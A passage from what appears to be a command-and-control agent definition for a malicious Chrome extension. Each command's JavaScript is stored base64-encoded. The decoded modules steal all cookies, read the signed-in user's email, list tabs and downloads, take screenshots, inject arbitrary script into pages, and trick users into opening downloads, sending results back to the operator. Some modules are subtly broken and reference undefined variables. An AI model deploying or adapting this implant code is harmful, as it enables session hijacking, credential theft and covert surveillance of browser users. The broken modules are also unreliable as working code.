ICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEMyLmNvbW1hbmRzW3Rhc2tuYW1lXShkYXRhKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiRXJyb3IgZXhlY3V0aW5nIHRhc2s6ICIgKyBlcnIpOwogICAgICAgICAgICAgICAgY29uc3QgZW52ZWxvcGUgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxpZCwgYXBmZWxsLnV1aWQsIGVyci5sZW5ndGgsIGRhdGFbJ3Rhc2tpZCddLCBkYXRhWyd0YXNrdHlwZSddLCBlcnIpOwogICAgICAgICAgICAgICAgY29uc3QgbWV0YSA9IHt9OwogICAgICAgICAgICAgICAgbWV0YS50eXBlID0gMzsKICAgICAgICAgICAgICAgIG1ldGEubWV0YWRhdGEgPSBlbnZlbG9wZTsKICAgICAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfTs="}]},"load_transforms":[],"create_transforms":[],"commands":[{"needs_admin":false,"help_cmd":"cookiedump","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Dump all cookies for the current session","cmd":"cookiedump","parameters":[],"attack":[],"artifacts":[],"files":[{"cookiedump.js":"Y29va2llZHVtcCA9IGZ1bmN0aW9uKHBhcmFtcykgewogICAgbGV0IHJlc3VsdHMgPSBbXTsKICAgIGxldCB0YXNraWQgPSBwYXJhbXNbJ3Rhc2tpZCddOwogICAgbGV0IHRhc2t0eXBlID0gcGFyYW1zWyd0YXNrdHlwZSddOwogICAgY2hyb21lLmNvb2tpZXMuZ2V0QWxsQ29va2llU3RvcmVzKGZ1bmN0aW9uKHN0b3JlcykgewogICAgICAgIHN0b3Jlcy5mb3JFYWNoKGZ1bmN0aW9uIChzdG9yZSkgewogICAgICAgICAgICBjb25zdCBmaWx0ZXIgPSB7fTsKICAgICAgICAgICAgZmlsdGVyWyJzdG9yZUlkIl0gPSBzdG9yZS5pZDsKICAgICAgICAgICAgY2hyb21lLmNvb2tpZXMuZ2V0QWxsKHsic3RvcmVJZCI6IHN0b3JlLmlkfSwgZnVuY3Rpb24gKGNvb2tpZXMpIHsKICAgICAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBidG9hKEpTT04uc3RyaW5naWZ5KGNvb2tpZXMsIG51bGwsIDIpKTsKICAgICAgICAgICAgICAgIGNvbnN0IGFwZmVsbG1zZyA9IENyZWF0ZUFwZmVsbE1lc3NhZ2UoMiwgYXBmZWxsLmFwZmVsbElELCBhcGZlbGwuVVVJRCwgZGF0YS5sZW5ndGgsIHRhc2tpZCwgdGFza3R5cGUsIGRhdGEpOwogICAgICAgICAgICAgICAgbGV0IG1ldGEgPSB7fTsKICAgICAgICAgICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgICAgICAgICAgICAgbWV0YVsibWV0YWRhdGEiXSA9IGFwZmVsbG1zZzsKICAgICAgICAgICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgICAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW2Nvb2tpZWR1bXAubmFtZV0gPSBjb29raWVkdW1wOwpDT01NQU5EX0VORFNfSEVSRQo="}]},{"needs_admin":false,"help_cmd":"cookieremove {\"url\":\"\",\"name\":\"\",\"storeid\":1}","version":3,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Deletes a cookie by name","cmd":"cookieremove","parameters":[{"type":"Number","hint":"","choices":"","required":false,"name":"storeid"},{"type":"String","hint":"The name of the cookie to remove ","choices":"","required":true,"name":"name"},{"type":"String","hint":"Name of the url associated with the cookie","choices":"","required":true,"name":"url"}],"attack":[],"artifacts":[],"files":[{"cookieremove.js":"Y29va2llcmVtb3ZlID0gZnVuY3Rpb24ocGFyYW1zKSB7CiAgICBsZXQgZGV0YWlscyA9IEpTT04ucGFyc2UoYXRvYihwYXJhbXNbJ2RhdGEnXS50b1N0cmluZygpKSk7CiAgICBsZXQgdGFza2lkID0gcGFyYW1zWyd0YXNraWQnXTsKICAgIGxldCB0YXNrdHlwZSA9IHBhcmFtc1sndGFza3R5cGUnXTsKICAgIGNocm9tZS5jb29raWVzLnJlbW92ZShkZXRhaWxzLCBmdW5jdGlvbihjb29raWUpewogICAgICAgIGxldCByZXNwOwogICAgICAgIGlmIChjb29raWUgPT09IG51bGwpIHsKICAgICAgICAgICAgcmVzcCA9IEpTT04uc3RyaW5naWZ5KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzcCA9IEpTT04uc3RyaW5naWZ5KGNvb2tpZSwgbnVsbCwgMik7CiAgICAgICAgfQoKICAgICAgICBjb25zdCBkYXRhID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQocmVzcCkpKTsKICAgICAgICBjb25zdCBhcGZlbGxNc2cgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIGRhdGEubGVuZ3RoLCB0YXNraWQsIHRhc2t0eXBlLCBkYXRhKTsKICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgICAgIG1ldGFbIm1ldGFkYXRhIl0gPSBhcGZlbGxNc2c7CiAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgIH0pOwoKfTsKCgpDMi5jb21tYW5kc1tjb29raWVyZW1vdmUubmFtZV0gPSBjb29raWVyZW1vdmU7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"cookieset {\"url\":\"http:\/\/www.example.com\/\",\"path\":\"\/login\",\"value\":\"DKkdafI\",\"name\":\"sessionID\",\"secure\":false,\"domain\":\"example.com\",\"httpOnly\":false,\"sameSite\":\"no_restriction\",\"expirationDate\":0,\"storeid\":1}","version":8,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Sets a cookie with the given cookie data; may overwrite equivalent cookies if they exist","cmd":"cookieset","parameters":[{"type":"String","hint":"The request-URI to associate with the setting of the cookie. This value can affect the default domain and path values of the created cookie. If host permissions for this URL are not specified in the manifest file, the API call will fail","choices":"","required":true,"name":"url"},{"type":"String","hint":"The path of the cookie. Defaults to the path portion of the url parameter.","choices":"","required":false,"name":"path"},{"type":"String","hint":"The value of the cookie. Empty by default if omitted.","choices":"","required":false,"name":"value"},{"type":"String","hint":"The name of the cookie. Empty by default if omitted","choices":"","required":false,"name":"name"},{"type":"Boolean","hint":"","choices":"","required":false,"name":"secure"},{"type":"String","hint":"The domain of the cookie. if omitted, the cookie becomes a host-only cookie.","choices":"","required":false,"name":"domain"},{"type":"Boolean","hint":"","choices":"","required":false,"name":"httpOnly"},{"type":"String","hint":"The cookies same-site status: defaults to 'no_restriction'","choices":"","required":false,"name":"sameSite"},{"type":"Number","hint":"","choices":"","required":false,"name":"expirationDate"},{"type":"Number","hint":"","choices":"","required":false,"name":"storeid"}],"attack":[],"artifacts":[],"files":[{"cookieset.js":"Y29va2llc2V0ID0gZnVuY3Rpb24ocGFyYW1zKSB7CiAgICBsZXQgZGV0YWlscyA9IEpTT04ucGFyc2UoYXRvYihwYXJhbXNbJ2RhdGEnXS50b1N0cmluZygpKSk7CiAgICBsZXQgdGFza2lkID0gcGFyYW1zWyd0YXNraWQnXTsKICAgIGxldCB0YXNrdHlwZSA9IHBhcmFtc1sndGFza3R5cGUnXTsKICAgIGNocm9tZS5jb29raWVzLnNldChkZXRhaWxzLCBmdW5jdGlvbihjb29raWUpewogICAgICAgIGxldCByZXNwOwogICAgICAgIGlmIChjb29raWUgPT09IG51bGwpIHsKICAgICAgICAgICAgcmVzcCA9IEpTT04uc3RyaW5naWZ5KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzcCA9IEpTT04uc3RyaW5naWZ5KGNvb2tpZSwgbnVsbCwgMik7CiAgICAgICAgfQoKICAgICAgICBjb25zdCBkYXRhID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQocmVzcCkpKTsKICAgICAgICBjb25zdCBhcGZlbGxNc2cgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIGRhdGEubGVuZ3RoLCB0YXNraWQsIHRhc2t0eXBlLCBkYXRhKTsKICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgICAgIG1ldGFbIm1ldGFkYXRhIl0gPSBhcGZlbGxNc2c7CiAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbY29va2llc2V0Lm5hbWVdID0gY29va2llc2V0OwpDT01NQU5EX0VORFNfSEVSRQo="}]},{"needs_admin":false,"help_cmd":"inject {\"tabid\":1,\"javascript\":\"base64encodedstring\"}","version":4,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Inject javascript into a browser tab","cmd":"inject","parameters":[{"type":"Number","hint":"","choices":"","required":true,"name":"tabid"},{"type":"String","hint":"Base64 encoded javascript to inject","choices":"","required":true,"name":"javascript"}],"attack":[],"artifacts":[],"files":[{"inject.js":"aW5qZWN0ID0gZnVuY3Rpb24ocGFyYW1zKSB7CiAgICAvLyBleGVjdXRlIGN1c3RvbSBqYXZhc2NyaXB0IGNvZGUgaW4gYSB0YWIKICAgIGxldCBhcmdzID0gSlNPTi5wYXJzZShhdG9iKHBhcmFtc1snZGF0YSddLnRvU3RyaW5nKCkpKTsKICAgIGNvbnN0IHRhYiA9IE1hdGgucm91bmQoYXJnc1sidGFiaWQiXSk7CiAgICBjb25zdCBjb2RlID0gYXRvYihhcmdzWyJqYXZhc2NyaXB0Il0pOwogICAgbGV0IHRhc2tpZCA9IHBhcmFtc1sndGFza2lkJ107CiAgICBsZXQgdGFza3R5cGUgPSBwYXJhbXNbJ3Rhc2t0eXBlJ107CiAgICBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KHRhYiwgewogICAgICAgIGNvZGU6IGNvZGUKICAgIH0sIGZ1bmN0aW9uKCl7CiAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICBDMi5zZW5kRXJyb3IodGFza2lkLCB0YXNrdHlwZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3Qgc3RhcnRlZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KHsnc3RhdHVzJzogJ3N0YXJ0ZWQnfSwgbnVsbCwgMikpKSk7CiAgICAgICAgICAgIGNvbnN0IGFwZmVsbG1zZyA9IENyZWF0ZUFwZmVsbE1lc3NhZ2UoMiwgYXBmZWxsLmFwZmVsbElELCBhcGZlbGwuVVVJRCwgc3RhcnRlZC5sZW5ndGgsIHRhc2tpZCwgdGFza3R5cGUsIHN0YXJ0ZWQpOwogICAgICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhWyJtZXRhdHlwZSJdID0gMzsKICAgICAgICAgICAgbWV0YVsibWV0YWRhdGEiXSA9IGFwZmVsbG1zZzsKICAgICAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgIG91dC5wdXNoKG1ldGFlbnZlbG9wZSk7CiAgICAgICAgfQogICAgfSk7Cn07CgpDMi5jb21tYW5kc1tpbmplY3QubmFtZV0gPSBpbmplY3Q7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"opendownload {\"downloadID\":1}","version":3,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Open a file download by download ID","cmd":"opendownload","parameters":[{"type":"Number","hint":"","choices":"","required":true,"name":"downloadID"}],"attack":[],"artifacts":[],"files":[{"opendownload.js":"b3BlbmRvd25sb2FkID0gZnVuY3Rpb24ocGFyYW1zKSB7CiAgICBsZXQgYXJncyA9IEpTT04ucGFyc2UoYXRvYihwYXJhbXNbJ2RhdGEnXS50b1N0cmluZygpKSk7CiAgICBjb25zdCBpZCA9IE1hdGgucm91bmQoYXJnc1siZG93bmxvYWRpZCJdKTsKICAgIGxldCBpY29uID0gY2hyb21lLmV4dGVuc2lvbi5nZXRVUkwoYXJnc1siaWNvblVSTCJdKTsKICAgIGxldCBtZXNzYWdlID0gYXJnc1sibWVzc2FnZSJdOwogICAgbGV0IGJ1dHRvblRleHQgPSBhcmdzWyJidXR0b25UZXh0Il07CiAgICBsZXQgdGl0bGUgPSBhcmdzWyJ0aXRsZSJdOwogICAgbGV0IHRhc2tpZCA9IHBhcmFtc1sndGFza2lkJ107CiAgICBsZXQgdGFza3R5cGUgPSBwYXJhbXNbJ3Rhc2t0eXBlJ107CiAgICBsZXQgYnV0dG9ucyA9IFt7InRpdGxlIjogYnV0dG9uVGV4dH1dOwogICAgbGV0IG9wdGlvbnMgPSB7IHR5cGU6ICJiYXNpYyIsIGljb25Vcmw6IGljb24sIHRpdGxlOiB0aXRsZSwgbWVzc2FnZTogbWVzc2FnZSwgcmVxdWlyZUludGVyYWN0aW9uOiB0cnVlLCBidXR0b25zOiBidXR0b25zIH07CiAgICBjaHJvbWUubm90aWZpY2F0aW9ucy5jcmVhdGUob3B0aW9ucywgZnVuY3Rpb24obm90aWZpY2F0aW9uSUQpIHsKICAgICAgICBjaHJvbWUubm90aWZpY2F0aW9ucy5vbkJ1dHRvbkNsaWNrZWQuYWRkTGlzdGVuZXIoZnVuY3Rpb24obm90aWZpY2F0aW9uSURhLCBiSW5kZXgpIHsKICAgICAgICAgICAgaWYobm90aWZpY2F0aW9uSUQgPT09IG5vdGlmaWNhdGlvbklEYSkgewogICAgICAgICAgICAgICAgY2hyb21lLmRvd25sb2Fkcy5vcGVuKGlkKTsKICAgICAgICAgICAgICAgIGNvbnN0IG9wZW5lZCA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KHsnc3RhdHVzJzogJ29wZW5lZCBkb3dubG9hZCB3aXRoIElEOiAnICsgaWR9LCBudWxsLCAyKSkpKTsKICAgICAgICAgICAgICAgIGNvbnN0IGFwZmVsbG1zZyA9IENyZWF0ZUFwZmVsbE1lc3NhZ2UoMiwgYXBmZWxsLmFwZmVsbElELCBhcGZlbGwuVVVJRCwgc3RhcnRlZC5sZW5ndGgsIHRhc2tpZCwgdGFza3R5cGUsIG9wZW5lZCk7CiAgICAgICAgICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgICAgICAgICAgbWV0YVsibWV0YXR5cGUiXSA9IDM7CiAgICAgICAgICAgICAgICBtZXRhWyJtZXRhZGF0YSJdID0gYXBmZWxsbXNnOwogICAgICAgICAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgICAgICBvdXQucHVzaChtZXRhZW52ZWxvcGUpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW29wZW5kb3dubG9hZC5uYW1lXSA9IG9wZW5kb3dubG9hZDsKQ09NTUFORF9FTkRTX0hFUkU="}]},{"needs_admin":false,"help_cmd":"screencapture","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Capture a screen shot of the active tab","cmd":"screencapture","parameters":[],"attack":[],"artifacts":[],"files":[{"screencapture.js":"c2NyZWVuY2FwdHVyZSA9IGZ1bmN0aW9uKHBhcmFtcyl7CiAgICBjaHJvbWUudGFicy5jYXB0dXJlVmlzaWJsZVRhYihudWxsLCBmdW5jdGlvbihpbWcpIHsKICAgICAgICBsZXQgdGFza2lkID0gcGFyYW1zWyd0YXNraWQnXTsKICAgICAgICBsZXQgdGFza3R5cGUgPSBwYXJhbXNbJ3Rhc2t0eXBlJ107CiAgICAgICAgaWYgKGltZyA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIEMyLnNlbmRFcnJvcih0YXNraWQsIHRhc2t0eXBlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBsZXQgZW5jSW1nID0gaW1nLnRvU3RyaW5nKCkuc3BsaXQoJywnKVsxXTsKICAgICAgICAgICAgY29uc3QgYXBmZWxsbXNnID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBlbmNJbWcubGVuZ3RoLCB0YXNraWQsIHRhc2t0eXBlLCBlbmNJbWcpOwogICAgICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgICAgICBtZXRhWyJtZXRhdHlwZSJdID0gMzsKICAgICAgICAgICAgbWV0YVsibWV0YWRhdGEiXSA9IGFwZmVsbG1zZzsKICAgICAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgIG91dC5wdXNoKG1ldGFlbnZlbG9wZSk7CiAgICAgICAgfQoKICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbc2NyZWVuY2FwdHVyZS5uYW1lXSA9IHNjcmVlbmNhcHR1cmU7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"search {params}","version":13,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Search file downloads","cmd":"search","parameters":[{"type":"Number","hint":"","choices":"","required":false,"name":"limit"},{"type":"String","hint":"absolute local path","choices":"","required":false,"name":"filename"},{"type":"Number","hint":"","choices":"","required":false,"name":"fileSize"},{"type":"String","hint":"The files mime type","choices":"","required":false,"name":"mime"},{"type":"String","hint":"The absolute URL that this download is being made from, after all redirects.","choices":"","required":false,"name":"finalUrl"},{"type":"String","hint":"The absolute URL that this download initiated from, before any redirects.","choices":"","required":false,"name":"url"},{"type":"Boolean","hint":"","choices":"","required":false,"name":"exists"},{"type":"String","hint":"Started after the given ms since the epoch","choices":"","required":false,"name":"startedAfter"},{"type":"String","hint":"Ended before the given ms since the epoch","choices":"","required":false,"name":"endedBefore"},{"type":"String","hint":"Started before the given ms since the epoch","choices":"","required":false,"name":"startedBefore"},{"type":"String","hint":"Ended after the given ms since the epoch","choices":"","required":false,"name":"endedAfter"},{"type":"Number","hint":"","choices":"","required":false,"name":"totalBytesLess"},{"type":"Number","hint":"","choices":"","required":false,"name":"totalBytesGreater"},{"type":"String","hint":"URL that matches the given regex","choices":"","required":false,"name":"urlRegex"},{"type":"String","hint":"Filename that matches the given regex","choices":"","required":false,"name":"filenameRegex"},{"type":"String","hint":"finalUrl matches the given regex","choices":"","required":false,"name":"finalUrlRegex"},{"type":"Choice","hint":"","choices":"file\nurl\ncontent\nuncommon\nhost\nunwanted\nsafe\naccepted","required":false,"name":"danger"},{"type":"String","hint":"time the download finished in ISO 8601 format","choices":"","required":false,"name":"endTime"},{"type":"String","hint":"time the download began in ISO 8601 format","choices":"","required":false,"name":"startTime"},{"type":"Boolean","hint":"","choices":"","required":false,"name":"paused"},{"type":"Choice","hint":"","choices":"in_progress\ninterrupted\ncomplete","required":false,"name":"state"},{"type":"Number","hint":"","choices":"","required":false,"name":"bytesReceived"},{"type":"Number","hint":"","choices":"","required":false,"name":"totalBytes"}],"attack":[],"artifacts":[],"files":[{"search.js":"c2VhcmNoID0gZnVuY3Rpb24ocGFyYW1zKSB7CiAgICBsZXQgYXJncyA9IEpTT04ucGFyc2UoYXRvYihwYXJhbXNbJ2RhdGEnXS50b1N0cmluZygpKSk7CiAgICBsZXQgdGFza2lkID0gcGFyYW1zWyd0YXNraWQnXTsKICAgIGxldCB0YXNrdHlwZSA9IHBhcmFtc1sndGFza3R5cGUnXTsKICAgIGNocm9tZS5kb3dubG9hZHMuc2VhcmNoKGFyZ3MsIGZ1bmN0aW9uKHJlc3VsdHMpIHsKICAgICAgICBjb25zdCBkYXRhID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkocmVzdWx0cywgbnVsbCwgMikpKSk7CiAgICAgICAgY29uc3QgYXBmZWxsbXNnID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBkYXRhLmxlbmd0aCwgdGFza2lkLCB0YXNrdHlwZSwgZGF0YSk7CiAgICAgICAgbGV0IG1ldGEgPSB7fTsKICAgICAgICBtZXRhWyJtZXRhdHlwZSJdID0gMzsKICAgICAgICBtZXRhWyJtZXRhZGF0YSJdID0gYXBmZWxsbXNnOwogICAgICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgICAgIG91dC5wdXNoKG1ldGFlbnZlbG9wZSk7CiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW3NlYXJjaC5uYW1lXSA9IHNlYXJjaDsKQ09NTUFORF9FTkRTX0hFUkU="}]},{"needs_admin":false,"help_cmd":"userinfo","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Retrieve the email address of the currently signed in user","cmd":"userinfo","parameters":[],"attack":[],"artifacts":[],"files":[{"userinfo.js":"dXNlcmluZm8gPSBmdW5jdGlvbihwYXJhbXMpIHsKICAgIGxldCB0YXNraWQgPSBwYXJhbXNbJ3Rhc2tpZCddOwogICAgbGV0IHRhc2t0eXBlID0gcGFyYW1zWyd0YXNrdHlwZSddOwogICAgY2hyb21lLmlkZW50aXR5LmdldFByb2ZpbGVVc2VySW5mbyhmdW5jdGlvbihpbmZvKXsKICAgICAgICBpZiAoaW5mbyA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIHNlbmRFcnJvcih0YXNraWQsIHRhc2t0eXBlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkYXRhID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoKEpTT04uc3RyaW5naWZ5KGluZm8sIG51bGwsIDIpKSkpKTsKICAgICAgICAgICAgY29uc3QgYXBmZWxsTXNnID0gQ3JlYXRlQXBmZWxsTWVzc2FnZSgyLCBhcGZlbGwuYXBmZWxsSUQsIGFwZmVsbC5VVUlELCBkYXRhLmxlbmd0aCwgdGFza2lkLCB0YXNrdHlwZSwgZGF0YSk7CiAgICAgICAgICAgIGxldCBtZXRhID0ge307CiAgICAgICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgICAgICAgICBtZXRhWyJtZXRhZGF0YSJdID0gYXBmZWxsTXNnOwogICAgICAgICAgICBjb25zdCBtZXRhZW52ZWxvcGUgPSBKU09OLnN0cmluZ2lmeShtZXRhKTsKICAgICAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgICAgICB9CiAgICB9KTsKfTsKCkMyLmNvbW1hbmRzW3VzZXJpbmZvLm5hbWVdID0gdXNlcmluZm87CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"tabs","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"List all open tabs","cmd":"tabs","parameters":[],"attack":[],"artifacts":[],"files":[{"tabs.js":"dGFicyA9IGZ1bmN0aW9uKHBhcmFtcykgewogICAgY29uc3QgcXVlcnlJbmZvID0ge307CiAgICBsZXQgdGFicyA9W107CiAgICBsZXQgdGFza2lkID0gcGFyYW1zWyd0YXNraWQnXTsKICAgIGxldCB0YXNrdHlwZSA9IHBhcmFtc1sndGFza3R5cGUnXTsKICAgIGNocm9tZS50YWJzLnF1ZXJ5KHF1ZXJ5SW5mbywgZnVuY3Rpb24ocmVzdWx0KXsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgcmVzdWx0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIGNvbnN0IGluZGl2aWR1YWxUYWIgPSB7fTsKICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi53aW5kb3cgPSByZXN1bHRbaV0udGl0bGU7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIudXJsID0gcmVzdWx0W2ldLnVybDsKICAgICAgICAgICAgaW5kaXZpZHVhbFRhYi5pbmNvZ25pdG8gPSByZXN1bHRbaV0uaW5jb2duaXRvOwogICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmlkID0gcmVzdWx0W2ldLmlkOwogICAgICAgICAgICBpbmRpdmlkdWFsVGFiLmFjdGl2ZSA9IHJlc3VsdFtpXS5hY3RpdmU7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIuaGlnaGxpZ2h0ZWQgPSByZXN1bHRbaV0uaGlnaGxpZ2h0ZWQ7CiAgICAgICAgICAgIGluZGl2aWR1YWxUYWIud2luZG93aWQgPSByZXN1bHRbaV0ud2luZG93SWQ7CgogICAgICAgICAgICB0YWJzLnB1c2goaW5kaXZpZHVhbFRhYik7CiAgICAgICAgfQogICAgICAgIGNvbnN0IGRhdGEgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeSh0YWJzLCBudWxsLCAyKSkpKTsKICAgICAgICBjb25zdCBhcGZlbGxNc2cgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIGRhdGEubGVuZ3RoLCB0YXNraWQsIHRhc2t0eXBlLCBkYXRhKTsKICAgICAgICBsZXQgbWV0YSA9IHt9OwogICAgICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgICAgIG1ldGFbIm1ldGFkYXRhIl0gPSBhcGZlbGxNc2c7CiAgICAgICAgY29uc3QgbWV0YWVudmVsb3BlID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgb3V0LnB1c2gobWV0YWVudmVsb3BlKTsKICAgIH0pOwp9OwoKQzIuY29tbWFuZHNbdGFicy5uYW1lXSA9IHRhYnM7CkNPTU1BTkRfRU5EU19IRVJFCg=="}]},{"needs_admin":false,"help_cmd":"exit","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","description":"Exit the extension","cmd":"exit","parameters":[],"attack":[],"artifacts":[],"files":[{"exit.js":"ZXhpdCA9IGZ1bmN0aW9uKHBhcmFtcykgewogICAgbGV0IHRhc2tpZCA9IHBhcmFtc1sndGFza2lkJ107CiAgICBsZXQgdGFza3R5cGUgPSBwYXJhbXNbJ3Rhc2t0eXBlJ107CiAgICBjb25zdCBhcGZlbGxtc2cgPSBDcmVhdGVBcGZlbGxNZXNzYWdlKDIsIGFwZmVsbC5hcGZlbGxJRCwgYXBmZWxsLlVVSUQsIGRhdGEubGVuZ3RoLCB0YXNraWQsIHRhc2t0eXBlLCAiZXhpdGluZyIpOwogICAgbGV0IG1ldGEgPSB7fTsKICAgIG1ldGFbIm1ldGF0eXBlIl0gPSAzOwogICAgbWV0YVsibWV0YWRhdGEiXSA9IGFwZmVsbE1zZzsKICAgIGNvbnN0IG1ldGFlbnZlbG9wZSA9IEpTT04uc3RyaW5naWZ5KG1ldGEpOwogICAgY29ubmVjdGlvbi5zZW5kKG1ldGFlbnZlbG9wZSk7CiAgICBjb25uZWN0aW9uLmNsb3NlKCk7Cn0KCkMyLmNvbW1hbmRzW2V4aXQubmFtZV0gPSBleGl0OwpDT01NQU5EX0VORFNfSEVSRQ=="}]}]}]}